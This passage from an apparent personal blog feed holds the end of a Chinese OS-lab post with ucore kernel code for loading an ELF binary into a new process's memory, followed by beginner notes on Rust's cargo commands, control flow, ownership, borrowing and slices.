process</span><br><span class="hljs-comment">     * (2) create a new PDT, and mm-&gt;pgdir= kernel virtual addr of PDT</span><br><span class="hljs-comment">     * (3) copy TEXT/DATA/BSS parts in binary to memory space of process</span><br><span class="hljs-comment">     *    (3.1) read raw data content in file and resolve elfhdr</span><br><span class="hljs-comment">     *    (3.2) read raw data content in file and resolve proghdr based on info in elfhdr</span><br><span class="hljs-comment">     *    (3.3) call mm_map to build vma related to TEXT/DATA</span><br><span class="hljs-comment">     *    (3.4) callpgdir_alloc_page to allocate page for TEXT/DATA, read contents in file</span><br><span class="hljs-comment">     *          and copy them into the new allocated pages</span><br><span class="hljs-comment">     *    (3.5) callpgdir_alloc_page to allocate pages for BSS, memset zero in these pages</span><br><span class="hljs-comment">     * (4) call mm_map to setup user stack, and put parameters into user stack</span><br><span class="hljs-comment">     * (5) setup current process&#x27;s mm, cr3, reset pgidr (using lcr3 MARCO)</span><br><span class="hljs-comment">     * (6) setup uargc and uargv in user stacks</span><br><span class="hljs-comment">     * (7) setup trapframe for user environment</span><br><span class="hljs-comment">     * (8) if up steps failed, you should cleanup the env.</span><br><span class="hljs-comment">     */</span><br>    assert(argc &gt;= <span class="hljs-number">0</span> &amp;&amp; argc &lt;= EXEC_MAX_ARG_NUM);<br><br>    <span class="hljs-keyword">if</span> (current-&gt;mm != <span class="hljs-literal">NULL</span>) &#123;<br>        panic(<span class="hljs-string">&quot;load_icode: current-&gt;mm must be empty.\n&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">int</span> ret = -E_NO_MEM;<br>    <span class="hljs-comment">// 创建proc的内存管理结构</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span>;</span><br>    <span class="hljs-keyword">if</span> ((mm = mm_create()) == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">goto</span> bad_mm;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (setup_pgdir(mm) != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">goto</span> bad_pgdir_cleanup_mm;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Page</span> *<span class="hljs-title">page</span>;</span><br>    <span class="hljs-comment">// LAB8 这里要从文件中读取ELF header，而不是Lab7中的内存了</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">elfhdr</span> __<span class="hljs-title">elf</span>, *<span class="hljs-title">elf</span> =</span> &amp;__elf;<br>    <span class="hljs-keyword">if</span> ((ret = load_icode_read(fd, elf, <span class="hljs-keyword">sizeof</span>(struct elfhdr), <span class="hljs-number">0</span>)) != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">goto</span> bad_elf_cleanup_pgdir;<br>    &#125;<br>    <span class="hljs-comment">// 判断读取入的elf header是否正确</span><br>    <span class="hljs-keyword">if</span> (elf-&gt;e_magic != ELF_MAGIC) &#123;<br>        ret = -E_INVAL_ELF;<br>        <span class="hljs-keyword">goto</span> bad_elf_cleanup_pgdir;<br>    &#125;<br>    <span class="hljs-comment">// 根据每一段的大小和基地址来分配不同的内存空间</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proghdr</span> __<span class="hljs-title">ph</span>, *<span class="hljs-title">ph</span> =</span> &amp;__ph;<br>    <span class="hljs-keyword">uint32_t</span> vm_flags, perm, phnum;<br>    <span class="hljs-keyword">for</span> (phnum = <span class="hljs-number">0</span>; phnum &lt; elf-&gt;e_phnum; phnum ++) &#123;<br>        <span class="hljs-comment">// LAB8 从文件特定偏移处读取每个段的详细信息（包括大小、基地址等等）</span><br>        <span class="hljs-keyword">off_t</span> phoff = elf-&gt;e_phoff + <span class="hljs-keyword">sizeof</span>(struct proghdr) * phnum;<br>        <span class="hljs-keyword">if</span> ((ret = load_icode_read(fd, ph, <span class="hljs-keyword">sizeof</span>(struct proghdr), phoff)) != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">goto</span> bad_cleanup_mmap;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (ph-&gt;p_type != ELF_PT_LOAD) &#123;<br>            <span class="hljs-keyword">continue</span> ;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (ph-&gt;p_filesz &gt; ph-&gt;p_memsz) &#123;<br>            ret = -E_INVAL_ELF;<br>            <span class="hljs-keyword">goto</span> bad_cleanup_mmap;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (ph-&gt;p_filesz == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">continue</span> ;<br>        &#125;<br>        vm_flags = <span class="hljs-number">0</span>, perm = PTE_U;<br>        <span class="hljs-keyword">if</span> (ph-&gt;p_flags &amp; ELF_PF_X) vm_flags |= VM_EXEC;<br>        <span class="hljs-keyword">if</span> (ph-&gt;p_flags &amp; ELF_PF_W) vm_flags |= VM_WRITE;<br>        <span class="hljs-keyword">if</span> (ph-&gt;p_flags &amp; ELF_PF_R) vm_flags |= VM_READ;<br>        <span class="hljs-keyword">if</span> (vm_flags &amp; VM_WRITE) perm |= PTE_W;<br>        <span class="hljs-comment">// 为当前段分配内存空间</span><br>        <span class="hljs-keyword">if</span> ((ret = mm_map(mm, ph-&gt;p_va, ph-&gt;p_memsz, vm_flags, <span class="hljs-literal">NULL</span>)) != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">goto</span> bad_cleanup_mmap;<br>        &#125;<br>        <span class="hljs-keyword">off_t</span> offset = ph-&gt;p_offset;<br>        <span class="hljs-keyword">size_t</span> off, size;<br>        <span class="hljs-keyword">uintptr_t</span> start = ph-&gt;p_va, end, la = ROUNDDOWN(start, PGSIZE);<br><br>        ret = -E_NO_MEM;<br><br>        end = ph-&gt;p_va + ph-&gt;p_filesz;<br>        <span class="hljs-keyword">while</span> (start &lt; end) &#123;<br>            <span class="hljs-comment">// 设置该内存所对应的页表项</span><br>            <span class="hljs-keyword">if</span> ((page = pgdir_alloc_page(mm-&gt;pgdir, la, perm)) == <span class="hljs-literal">NULL</span>) &#123;<br>                ret = -E_NO_MEM;<br>                <span class="hljs-keyword">goto</span> bad_cleanup_mmap;<br>            &#125;<br>            off = start - la, size = PGSIZE - off, la += PGSIZE;<br>            <span class="hljs-keyword">if</span> (end &lt; la) &#123;<br>                size -= la - end;<br>            &#125;<br>            <span class="hljs-comment">// LAB8 读取elf对应段内的数据并写入至该内存中</span><br>            <span class="hljs-keyword">if</span> ((ret = load_icode_read(fd, page2kva(page) + off, size, offset)) != <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">goto</span> bad_cleanup_mmap;<br>            &#125;<br>            start += size, offset += size;<br>        &#125;<br>        end = ph-&gt;p_va + ph-&gt;p_memsz;<br>        <span class="hljs-comment">// 对于段中当前页中剩余的空间（复制elf数据后剩下的空间），将其置为0</span><br>        <span class="hljs-keyword">if</span> (start &lt; la) &#123;<br>            <span class="hljs-comment">/* ph-&gt;p_memsz == ph-&gt;p_filesz */</span><br>            <span class="hljs-keyword">if</span> (start == end) &#123;<br>                <span class="hljs-keyword">continue</span> ;<br>            &#125;<br>            off = start + PGSIZE - la, size = PGSIZE - off;<br>            <span class="hljs-keyword">if</span> (end &lt; la) &#123;<br>                size -= la - end;<br>            &#125;<br>            <span class="hljs-built_in">memset</span>(page2kva(page) + off, <span class="hljs-number">0</span>, size);<br>            start += size;<br>            assert((end &lt; la &amp;&amp; start == end) || (end &gt;= la &amp;&amp; start == la));<br>        &#125;<br>        <span class="hljs-comment">// 对于段中剩余页中的空间（复制elf数据后的多余页面），将其置为0</span><br>        <span class="hljs-keyword">while</span> (start &lt; end) &#123;<br>            <span class="hljs-keyword">if</span> ((page = pgdir_alloc_page(mm-&gt;pgdir, la, perm)) == <span class="hljs-literal">NULL</span>) &#123;<br>                ret = -E_NO_MEM;<br>                <span class="hljs-keyword">goto</span> bad_cleanup_mmap;<br>            &#125;<br>            off = start - la, size = PGSIZE - off, la += PGSIZE;<br>            <span class="hljs-keyword">if</span> (end &lt; la) &#123;<br>                size -= la - end;<br>            &#125;<br>            <span class="hljs-built_in">memset</span>(page2kva(page) + off, <span class="hljs-number">0</span>, size);<br>            start += size;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// 关闭读取的ELF</span><br>    sysfile_close(fd);<br><br>    <span class="hljs-comment">// 设置栈内存</span><br>    vm_flags = VM_READ | VM_WRITE | VM_STACK;<br>    <span class="hljs-keyword">if</span> ((ret = mm_map(mm, USTACKTOP - USTACKSIZE, USTACKSIZE, vm_flags, <span class="hljs-literal">NULL</span>)) != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">goto</span> bad_cleanup_mmap;<br>    &#125;<br>    assert(pgdir_alloc_page(mm-&gt;pgdir, USTACKTOP-PGSIZE , PTE_USER) != <span class="hljs-literal">NULL</span>);<br>    assert(pgdir_alloc_page(mm-&gt;pgdir, USTACKTOP<span class="hljs-number">-2</span>*PGSIZE , PTE_USER) != <span class="hljs-literal">NULL</span>);<br>    assert(pgdir_alloc_page(mm-&gt;pgdir, USTACKTOP<span class="hljs-number">-3</span>*PGSIZE , PTE_USER) != <span class="hljs-literal">NULL</span>);<br>    assert(pgdir_alloc_page(mm-&gt;pgdir, USTACKTOP<span class="hljs-number">-4</span>*PGSIZE , PTE_USER) != <span class="hljs-literal">NULL</span>);<br><br>    mm_count_inc(mm);<br>    <span class="hljs-comment">// 设置CR3页表相关寄存器</span><br>    current-&gt;mm = mm;<br>    current-&gt;cr3 = PADDR(mm-&gt;pgdir);<br>    lcr3(PADDR(mm-&gt;pgdir));<br><br>    <span class="hljs-comment">//setup argc, argv</span><br>    <span class="hljs-comment">// LAB8 设置execve所启动的程序参数</span><br>    <span class="hljs-keyword">uint32_t</span> argv_size=<span class="hljs-number">0</span>, i;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; argc; i ++) &#123;<br>        argv_size += strnlen(kargv[i],EXEC_MAX_ARG_LEN + <span class="hljs-number">1</span>)+<span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">uintptr_t</span> stacktop = USTACKTOP - (argv_size/<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">long</span>)+<span class="hljs-number">1</span>)*<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">long</span>);<br>    <span class="hljs-comment">// 直接将传入的参数压入至新栈的底部</span><br>    <span class="hljs-keyword">char</span>** uargv=(<span class="hljs-keyword">char</span> **)(stacktop  - argc * <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">char</span> *));<br><br>    argv_size = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; argc; i ++) &#123;<br>        uargv[i] = <span class="hljs-built_in">strcpy</span>((<span class="hljs-keyword">char</span> *)(stacktop + argv_size ), kargv[i]);<br>        argv_size +=  strnlen(kargv[i],EXEC_MAX_ARG_LEN + <span class="hljs-number">1</span>)+<span class="hljs-number">1</span>;<br>    &#125;<br><br>    stacktop = (<span class="hljs-keyword">uintptr_t</span>)uargv - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>);<br>    *(<span class="hljs-keyword">int</span> *)stacktop = argc;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">trapframe</span> *<span class="hljs-title">tf</span> =</span> current-&gt;tf;<br>    <span class="hljs-built_in">memset</span>(tf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(struct trapframe));<br>    tf-&gt;tf_cs = USER_CS;<br>    tf-&gt;tf_ds = tf-&gt;tf_es = tf-&gt;tf_ss = USER_DS;<br>    tf-&gt;tf_esp = stacktop;<br>    tf-&gt;tf_eip = elf-&gt;e_entry;<br>    tf-&gt;tf_eflags = FL_IF;<br>    ret = <span class="hljs-number">0</span>;<br>out:<br>    <span class="hljs-keyword">return</span> ret;<br>bad_cleanup_mmap:<br>    exit_mmap(mm);<br>bad_elf_cleanup_pgdir:<br>    put_pgdir(mm);<br>bad_pgdir_cleanup_mm:<br>    mm_destroy(mm);<br>bad_mm:<br>    <span class="hljs-keyword">goto</span> out;<br>&#125;<br></code></pre></div></td></tr></table></figure><blockquote><p>给出设计实现基于”<strong>UNIX的硬链接和软链接机制</strong>“的概要设方案</p></blockquote><p>emmmm</p><ul><li>moocos的密码是空格<section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span>即原先查找页目录表的目的是想将某个线性地址转换为物理地址，但如果页目录表中存放的是二级页表的<strong>线性</strong>地址，则需要先查找该二级页表的物理地址，此时需要递归查找，这可能会出现永远也查找不到物理地址的情况。<a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section></li></ul>]]></content>
    
    
    <categories>
      
      <category>CS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Specialty in Rust</title>
    <link href="/2021-09/Learning-Specialty-in-Rust/"/>
    <url>/2021-09/Learning-Specialty-in-Rust/</url>
    
    <content type="html"><![CDATA[<h1 id="commandline"><a href="#commandline" class="headerlink" title="commandline"></a>commandline</h1><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat">cargo doc <br>cargo doc --open<br>rustc --explain (something)<br></code></pre></div></td></tr></table></figure><h1 id="common-concepts"><a href="#common-concepts" class="headerlink" title="common concepts"></a>common concepts</h1><h2 id="code-example"><a href="#code-example" class="headerlink" title="code example"></a>code example</h2><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-keyword">use</span> rand::Rng;<br><span class="hljs-keyword">use</span> std::cmp::Ordering;<br><span class="hljs-keyword">use</span> std::io;<br><br><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">main</span></span>() &#123;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Guess the number!&quot;</span>);<br><br>    <span class="hljs-keyword">let</span> secret_number = rand::thread_rng().gen_range(<span class="hljs-number">1</span>..<span class="hljs-number">101</span>);<br><br>    <span class="hljs-keyword">loop</span> &#123;<br>        <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Please input your guess.&quot;</span>);<br>        <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut</span> guess = <span class="hljs-built_in">String</span>::new();<br>        io::stdin()<br>            .read_line(&amp;<span class="hljs-keyword">mut</span> guess)<br>            .expect(<span class="hljs-string">&quot;Failed to read line&quot;</span>);<br>        <span class="hljs-keyword">let</span> guess: <span class="hljs-built_in">u32</span> = <span class="hljs-keyword">match</span> guess.trim().parse() &#123;<br>            <span class="hljs-literal">Ok</span>(num) =&gt; num,<br>            <span class="hljs-literal">Err</span>(_) =&gt; <span class="hljs-keyword">continue</span>,<br>        &#125;;<br><br>        <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;You guessed: &#123;&#125;&quot;</span>, guess);<br><br>        <span class="hljs-keyword">match</span> guess.cmp(&amp;secret_number) &#123;<br>            Ordering::Less =&gt; <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Too small!&quot;</span>),<br>            Ordering::Greater =&gt; <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Too big!&quot;</span>),<br>            Ordering::Equal =&gt; &#123;<br>                <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;You win!&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li><code>cargo doc --open</code> doc is stored in the folder.</li><li>something special in enumeration waiting for me to be explored </li><li>Rust <strong>doesn’t care where you define your functions, only that they’re defined somewhere.</strong>  </li><li>Statements do not return values. Therefore, you can’t assign a <code>let</code> statement to another variable, and can’t use x=y=6 to have both x and y have the value 6</li><li>Rust will do check of every <strong>array indexing operation</strong>, thus will run slowly</li></ul><h2 id="about-return-statement"><a href="#about-return-statement" class="headerlink" title="about return statement"></a>about return statement</h2><ul><li>Block is expression, expressions do not include ending semicolons. Most functions return the last <strong>expression</strong> implicitly. Assigning a block of statements to a variable will get an empty tuple, expressed by “()”.</li></ul><h2 id="if-expressions"><a href="#if-expressions" class="headerlink" title="if expressions"></a>if <strong><code>expressions</code></strong></h2><ul><li>no parentheses in <code>return</code> and <code>if</code> keyword, Blocks of code associated with the conditions in <code>if</code> expressions are sometimes called <em><strong>arms</strong></em> </li><li>Rust will not automatically try to convert non-Boolean types to a Boolean, do not use integer as the condition of <code>if</code>, instead using an integer greater or less than or equal to an certain number. </li><li>if else if else if …… may be changed to <code>match</code>  </li><li><code>let number = if condition &#123; 5 &#125; else &#123; 6 &#125;;</code> don’t use different types in each arms.</li></ul><h2 id="Repeating"><a href="#Repeating" class="headerlink" title="Repeating"></a>Repeating</h2><ul><li><strong><code>loop</code></strong>(use <code>break</code> and <code>^C</code> to terminate)  , <code>while</code>, and <code>for</code> </li><li><code>break</code> can <strong>take a value</strong> as the return of the <code>loop</code> </li><li>use <code>for element in a.iter()</code> to speed up array indexing </li><li><code>for</code> : <code>for number in (1..4).rev()</code> </li></ul><h1 id="ownership"><a href="#ownership" class="headerlink" title="ownership"></a>ownership</h1><blockquote><p>Ownership is Rust’s most unique feature, and it enables Rust to make memory safety guarantees without needing a garbage collector.    </p><p>Memory Management: Memory is managed through a system of ownership with a set of rules that the compiler checks at <strong>compile time</strong>, won’t slow down your program.</p></blockquote><h2 id="ownership-rules"><a href="#ownership-rules" class="headerlink" title="ownership rules:"></a>ownership rules:</h2><blockquote><ol><li>Each value in Rust has a variable that’s called its <em>owner</em>.</li><li>There can only be one owner at a time.</li><li>When the owner goes out of scope, the value will be dropped.</li></ol></blockquote><ul><li><p><strong>immutable</strong> string literals and the <strong>changeable</strong> String type </p></li><li><p>create a <code>String</code> from a string literal using the <code>from</code> function: <code>let s = String::from(&quot;hello&quot;);</code> </p></li><li><p>Rust takes a different path from those languages having GC: the memory is <u>automatically returned</u> once the variable that owns it goes out of scope.</p></li><li><p>Rust calls a special function for us. This function is called <a href="https://doc.rust-lang.org/std/ops/trait.Drop.html#tymethod.drop"><code>drop</code></a>, and it’s where the author of <code>String</code> can put the code to return the memory. Rust calls <code>drop</code> automatically at the closing curly bracket.</p></li><li><p>the following code will lead to a move instead of a shallow or deep copy, or you can use <code>s1.clone()</code> to do deep copy</p><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-keyword">let</span> s1 = <span class="hljs-built_in">String</span>::from(<span class="hljs-string">&quot;hello&quot;</span>);<br><span class="hljs-keyword">let</span> s2 = s1;<br></code></pre></div></td></tr></table></figure></li><li><p>there is <code>copy</code> and <code>drop</code> trait, which won’t coexist, the former will leave old value as valid.</p></li><li><p><strong>Ownership and Functions</strong> </p><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">main</span></span>() &#123;<br>    <span class="hljs-keyword">let</span> s = <span class="hljs-built_in">String</span>::from(<span class="hljs-string">&quot;hello&quot;</span>);  <span class="hljs-comment">// s comes into scope</span><br><br>    takes_ownership(s);             <span class="hljs-comment">// s&#x27;s value moves into the function...</span><br>                                    <span class="hljs-comment">// ... and so is no longer valid here</span><br><br>    <span class="hljs-keyword">let</span> x = <span class="hljs-number">5</span>;                      <span class="hljs-comment">// x comes into scope</span><br><br>    makes_copy(x);                  <span class="hljs-comment">// x would move into the function,</span><br>                                    <span class="hljs-comment">// but i32 is Copy, so it&#x27;s okay to still</span><br>                                    <span class="hljs-comment">// use x afterward</span><br><br>&#125; <span class="hljs-comment">// Here, x goes out of scope, then s. But because s&#x27;s value was moved, nothing</span><br>  <span class="hljs-comment">// special happens.</span><br><br><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">takes_ownership</span></span>(some_string: <span class="hljs-built_in">String</span>) &#123; <span class="hljs-comment">// some_string comes into scope</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, some_string);<br>&#125; <span class="hljs-comment">// Here, some_string goes out of scope and `drop` is called. The backing</span><br>  <span class="hljs-comment">// memory is freed.</span><br><br><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">makes_copy</span></span>(some_integer: <span class="hljs-built_in">i32</span>) &#123; <span class="hljs-comment">// some_integer comes into scope</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, some_integer);<br>&#125; <span class="hljs-comment">// Here, some_integer goes out of scope. Nothing special happens.</span><br></code></pre></div></td></tr></table></figure></li><li><p><strong>Return Values and Scope</strong> </p><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">main</span></span>() &#123;<br>    <span class="hljs-keyword">let</span> s1 = gives_ownership();         <span class="hljs-comment">// gives_ownership moves its return</span><br>                                        <span class="hljs-comment">// value into s1</span><br><br>    <span class="hljs-keyword">let</span> s2 = <span class="hljs-built_in">String</span>::from(<span class="hljs-string">&quot;hello&quot;</span>);     <span class="hljs-comment">// s2 comes into scope</span><br><br>    <span class="hljs-keyword">let</span> s3 = takes_and_gives_back(s2);  <span class="hljs-comment">// s2 is moved into</span><br>                                        <span class="hljs-comment">// takes_and_gives_back, which also</span><br>                                        <span class="hljs-comment">// moves its return value into s3</span><br>&#125; <span class="hljs-comment">// Here, s3 goes out of scope and is dropped. s2 goes out of scope but was</span><br>  <span class="hljs-comment">// moved, so nothing happens. s1 goes out of scope and is dropped.</span><br><br><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">gives_ownership</span></span>() -&gt; <span class="hljs-built_in">String</span> &#123;             <span class="hljs-comment">// gives_ownership will move its</span><br>                                             <span class="hljs-comment">// return value into the function</span><br>                                             <span class="hljs-comment">// that calls it</span><br><br>    <span class="hljs-keyword">let</span> some_string = <span class="hljs-built_in">String</span>::from(<span class="hljs-string">&quot;hello&quot;</span>); <span class="hljs-comment">// some_string comes into scope</span><br><br>    some_string                              <span class="hljs-comment">// some_string is returned and</span><br>                                             <span class="hljs-comment">// moves out to the calling</span><br>                                             <span class="hljs-comment">// function</span><br>&#125;<br><br><span class="hljs-comment">// takes_and_gives_back will take a String and return one</span><br><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">takes_and_gives_back</span></span>(a_string: <span class="hljs-built_in">String</span>) -&gt; <span class="hljs-built_in">String</span> &#123; <span class="hljs-comment">// a_string comes into</span><br>                                                      <span class="hljs-comment">// scope</span><br><br>    a_string  <span class="hljs-comment">// a_string is returned and moves out to the calling function</span><br>&#125;<br></code></pre></div></td></tr></table></figure></li></ul><h2 id="References-and-Borrowing"><a href="#References-and-Borrowing" class="headerlink" title="References and Borrowing"></a>References and Borrowing</h2><ul><li>we call having references as function parameters <em>borrowing</em> </li><li>Reference’s <strong>default  immutable</strong>  </li><li><strong>Use mutabel parameter:</strong> <ol><li>First, we had to change <strong>variable</strong> <code>s</code> to be <code>mut</code>. </li><li>Then we had to create a mutable reference with <code>&amp;mut s</code> </li><li>and accept a mutable reference in the function with <code>some_string: &amp;mut String</code>.</li></ol></li><li><strong>you can have only one mutable reference to a particular piece of data in a particular scope(avoiding <em>race</em>)</strong></li></ul><blockquote><p>A <em><strong>data race</strong></em> is similar to a race condition and happens when these three behaviors occur:</p><ul><li>Two or more pointers access the same data at the same time.</li><li>At least one of the pointers is being used to write to the data.</li><li>There’s no mechanism being used to synchronize access to the data.</li></ul><p>The Rust prevents it by giving out an error.</p></blockquote><ul><li>E0502: A variable already borrowed as immutable was borrowed as mutable. </li></ul><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">bar</span></span>(x: &amp;<span class="hljs-keyword">mut</span> <span class="hljs-built_in">i32</span>) &#123;&#125;<br><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">foo</span></span>(a: &amp;<span class="hljs-keyword">mut</span> <span class="hljs-built_in">i32</span>) &#123;<br>    <span class="hljs-keyword">let</span> y = &amp;a; <span class="hljs-comment">// a is borrowed as immutable.</span><br>    bar(a);     <span class="hljs-comment">// as immutable</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, y);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>To fix this error, ensure that you don’t have any other references to the variable before trying to access it mutably:   </p><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">bar</span></span>(x: &amp;<span class="hljs-keyword">mut</span> <span class="hljs-built_in">i32</span>) &#123;&#125;<br><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">foo</span></span>(a: &amp;<span class="hljs-keyword">mut</span> <span class="hljs-built_in">i32</span>) &#123;<br>    bar(a);<br>    <span class="hljs-keyword">let</span> y = &amp;a; <span class="hljs-comment">// ok!</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, y); <br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="The-slice-type"><a href="#The-slice-type" class="headerlink" title="The slice type"></a>The slice type</h2><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">first_word</span></span>(s: &amp;<span class="hljs-built_in">String</span>) -&gt; <span class="hljs-built_in">usize</span> &#123;<br>    <span class="hljs-keyword">let</span> bytes = s.as_bytes();<br><br>    <span class="hljs-keyword">for</span> (i, &amp;item) <span class="hljs-keyword">in</span> bytes.iter().enumerate() &#123; <br><span class="hljs-comment">//iter is a method that returns each element in a collection and that enumerate wraps the result of iter </span><br>    <span class="hljs-comment">//and returns each element as part of a tuple instead.(first index, second the reference)</span><br>        <span class="hljs-keyword">if</span> item == <span class="hljs-string">b&#x27; &#x27;</span> &#123;<br>            <span class="hljs-keyword">return</span> i;<br>        &#125;<br>    &#125;<br>    s.len()<br>&#125;<br><span class="hljs-function"><span 